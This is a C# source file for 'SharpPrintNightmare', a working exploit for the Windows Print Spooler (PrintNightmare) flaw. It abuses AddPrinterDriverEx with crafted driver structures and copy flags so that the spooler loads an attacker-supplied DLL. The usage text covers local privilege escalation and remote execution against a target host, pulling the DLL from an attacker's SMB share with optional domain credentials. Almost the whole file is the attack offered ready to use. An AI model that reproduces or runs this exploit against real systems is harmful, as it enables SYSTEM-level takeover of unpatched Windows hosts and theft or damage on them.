using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using Tools;

namespace SharpPrintNightmare
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AddPrinterDriverEx([Optional] string pName, uint Level, [In, Out] IntPtr pDriverInfo, uint dwFileCopyFlags);

        //https://www.pinvoke.net/default.aspx/winspool/EnumPrinterDrivers.html
        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool EnumPrinterDrivers(String pName, String pEnvironment, uint level, IntPtr pDriverInfo, uint cdBuf, ref uint pcbNeeded, ref uint pcRetruned);

        public struct DRIVER_INFO_2
        {
            public uint cVersion;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pEnvironment;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDriverPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDataFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pConfigFile;
        }

        // 3.1.4.4.8 RpcAddPrinterDriverEx Values
        public static uint APD_STRICT_UPGRADE = 0x00000001;
        public static uint APD_STRICT_DOWNGRADE = 0x00000002;
        public static uint APD_COPY_ALL_FILES = 0x00000004;
        public static uint APD_COPY_NEW_FILES = 0x00000008;
        public static uint APD_COPY_FROM_DIRECTORY = 0x00000010;
        public static uint APD_DONT_COPY_FILES_TO_CLUSTER = 0x00001000;
        public static uint APD_COPY_TO_ALL_SPOOLERS = 0x00002000;
        public static uint APD_INSTALL_WARNED_DRIVER = 0x00008000;
        public static uint APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000;

        static void Main(string[] args)
        {
            string dllpath;
            string computername = null;
            string pDriverPath = null;
            //network credentials wont be used for LPE
            string domain = "NeverGonnaGiveYouUp";
            string user = "NeverGonnaLetYouDown";
            string password = "NeverGonnaRunAroundAndDesertYou";

            if (args == null || args.Length == 0)
            {
                Console.WriteLine("-Locally");
                Console.WriteLine(" .\\SharpPrintNightmare.exe C:\\addCube.dll");
                Console.WriteLine("-Remote using current context");
                Console.WriteLine(" .\\SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' '\\\\192.168.1.20'");
                Console.WriteLine("-Remote using runas");
                Console.WriteLine(" .\\SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' '\\\\192.168.1.20' hackit.local domain_user Pass123");
                Environment.Exit(0);
            }
            dllpath = args[0];
            if (dllpath.Contains("\\\\"))
            {
                dllpath = dllpath.Replace("\\\\", "\\??\\UNC\\");
            }

            if (args.Length > 2)
            {
                domain = args[2];
                user = args[3];
                password = args[4];
            }

            //runas /netonly
            using (new Impersonator.Impersonation(domain, user, password))
            {
                if (args.Length > 1 && args.Length <= 5)
                {
                    //Find remote drivers
                    computername = args[1];
                    List<string> drivers = getDrivers(computername);
                    pDriverPath = Path.GetDirectoryName(drivers[0]) + "\\Amd64\\UNIDRV.DLL";
                    if (string.IsNullOrEmpty(pDriverPath))
                    {
                        Console.WriteLine($"[-] Specify pDriverPath manually");
                        Environment.Exit(1);
                    }
                }
                //if OpenRemoteBaseKey fails
                else if (args.Length > 5)
                {
                    pDriverPath = args[5];
                }
                else //Find local driver
                {
                    DRIVER_INFO_2[] drivers = getDrivers();
                    foreach (DRIVER_INFO_2 driver in drivers)
                    {
                        //Console.WriteLine(driver.pDriverPath); //debugcd 
                        if (driver.pDriverPath.ToLower().Contains("filerepository"))
                        {
                            pDriverPath = driver.pDriverPath;
                            break;
                        }
                    }
                    //could not find driver path
                    if (string.IsNullOrEmpty(pDriverPath))
                    {
                        Console.WriteLine($"[-] pDriverPath {drivers[0].pDriverPath}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....");
                        Console.WriteLine($"[-] Specify pDriverPath manually");
                        Environment.Exit(1);
                    }
                }
                Console.WriteLine($"[*] pDriverPath {pDriverPath}");
                Console.WriteLine($"[*] Executing {dllpath}");
                Console.WriteLine("[*] Try 1...");
                addPrinter(dllpath, pDriverPath, computername);
                Console.WriteLine("[*] Try 2...");
                addPrinter(dllpath, pDriverPath, computername);
                Console.WriteLine("[*] Try 3...");
                addPrinter(dllpath, pDriverPath, computername);
            }
        }

        static void addPrinter(string dllpath, string pDriverPath, string computername)
        {
            //pDriverPath = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL"; // 2019 debug
            //pDriverPath = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL"; // 2016 debug

            DRIVER_INFO_2 Level2 = new DRIVER_INFO_2();
            Level2.cVersion = 3;
            Level2.pConfigFile = "C:\\Windows\\System32\\winhttp.dll"; //replace kernelbase with winhttp
            Level2.pDataFile = dllpath;
            Level2.pDriverPath = pDriverPath;
            Level2.pEnvironment = "Windows x64";
            Level2.pName = "12345";

            string filename = Path.GetFileName(dllpath);
            uint flags = APD_COPY_ALL_FILES | 0x10 | 0x8000;

            //convert struct to unmanage code
            IntPtr pnt = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
            Marshal.StructureToPtr(Level2, pnt, false);

            //call AddPrinterDriverEx
            AddPrinterDriverEx(computername, 2, pnt, flags);
            Console.WriteLine("[*] Stage 0: " + Marshal.GetLastWin32Error());
            Marshal.FreeHGlobal(pnt);

            //Dont ask me why this works
            Level2.pConfigFile = "C:\\Windows\\System32\\kernelbase.dll";
            for (int i = 1; i <= 30; i++)
            {
                //add path to our exploit
                Level2.pConfigFile = $"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{filename}";
                //convert struct to unmanage code
                IntPtr pnt2 = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
                Marshal.StructureToPtr(Level2, pnt2, false);

                //call AddPrinterDriverEx
                AddPrinterDriverEx(computername, 2, pnt2, flags);
                int errorcode = Marshal.GetLastWin32Error();
                Marshal.FreeHGlobal(pnt2);
                if (errorcode == 0)
                {
                    Console.WriteLine($"[*] Stage {i}: " + errorcode);
                    Console.WriteLine($"[+] Exploit Completed");
                    Environment.Exit(0);
                }
            }
        }

        static List<string> getDrivers(string computername)
        {
            computername = computername.Trim('\\');
            string driverpath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\PackageInstallation\\Windows x64\\DriverPackages";
            List<string> drivers = new List<string>();
            try
            {
                RegistryKey environmentKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computername);

                foreach (string subKeyName in environmentKey.OpenSubKey(driverpath).GetSubKeyNames().Where(item => item.Contains("ntprint.inf_amd64")))
                {
                    string path;
                    //Console.WriteLine(subKeyName);
                    path = (string)environmentKey.OpenSubKey(driverpath + "\\" + subKeyName).GetValue("DriverStorePath");
                    //Console.WriteLine(path);
                    if (!String.IsNullOrEmpty(path))
                    {
                        drivers.Add(path);
                    }
                }
                environmentKey.Close();
            }
            catch
            {
                Console.WriteLine("[-] Failed to enumerate printer drivers");
                Environment.Exit(1);
            }

            return drivers;

        }

        static DRIVER_INFO_2[] getDrivers()
        {
            uint cbNeeded = 0;
            uint cReturned = 0;

            if (EnumPrinterDrivers(null, "Windows x64", 2, IntPtr.Zero, 0, ref cbNeeded, ref cReturned))
            {
                //succeeds, but shouldn't, because buffer is zero (too small)!
                throw new Exception("EnumPrinters should fail!");
            }

            int lastWin32Error = Marshal.GetLastWin32Error();
            //ERROR_INSUFFICIENT_BUFFER = 122 expected, if not -> Exception
            if (lastWin32Error != 122)
            {
                throw new Win32Exception(lastWin32Error);
            }

            IntPtr pAddr = Marshal.AllocHGlobal((int)cbNeeded);
            if (EnumPrinterDrivers(null, "Windows x64", 2, pAddr, cbNeeded, ref cbNeeded, ref cReturned))
            {
                DRIVER_INFO_2[] printerInfo2 = new DRIVER_INFO_2[cReturned];
                long offset;
                offset = pAddr.ToInt64();
                Type type = typeof(DRIVER_INFO_2);
                int increment = Marshal.SizeOf(type);
                for (int i = 0; i < cReturned; i++)
                {
                    printerInfo2[i] = (DRIVER_INFO_2)Marshal.PtrToStructure(new IntPtr(offset), type);
                    offset += increment;
                }
                Marshal.FreeHGlobal(pAddr);
                return printerInfo2;
            }

            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
    }
}
